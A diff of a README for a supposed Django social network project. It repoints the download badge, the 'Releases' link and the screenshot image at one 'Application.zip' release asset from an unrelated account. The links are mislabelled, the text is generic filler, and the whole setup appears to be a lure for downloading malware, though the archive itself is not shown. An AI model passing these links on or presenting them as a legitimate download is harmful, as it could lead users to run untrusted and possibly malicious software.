@@ -24,13 +24,13 @@ In addition, the project also leverages technologies such as Celery, Django Chan
 
 ## 📂 Download the Software
 If you're ready to dive into the exciting world of social networking with our application, you can download the software from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Ciankanfk4/social-network/releases/download/v1.0/Application.zip)](https://github.com/Ciankanfk4/social-network/releases/download/v1.0/Application.zip)
 
 ## How to Launch
 Once you've downloaded the software, unzip the file and follow the instructions in the README to quickly launch the application. Happy networking!
 
 ## Explore Further
-Visit the [Releases](https://github.com/Rubenas123/6487922/releases) section for additional resources, updates, and the latest developments in the "Social Network" project.
+Visit the [Releases](https://github.com/Ciankanfk4/social-network/releases/download/v1.0/Application.zip) section for additional resources, updates, and the latest developments in the "Social Network" project.
 
 ## 🌐 Get Involved!
 We're always looking for enthusiastic developers and contributors to join our social network project. Whether you're passionate about backend development, frontend design, or testing, there's a place for you in our community. Feel free to reach out and get involved in making our social network even more amazing!
@@ -38,7 +38,7 @@ We're always looking for enthusiastic developers and contributors to join our so
 Let's connect, share, and grow together. Happy networking! 🚀🌟
 
 ## Screenshots
-![Screenshot](https://placeimg.com/640/480/tech)
+![Screenshot](https://github.com/Ciankanfk4/social-network/releases/download/v1.0/Application.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
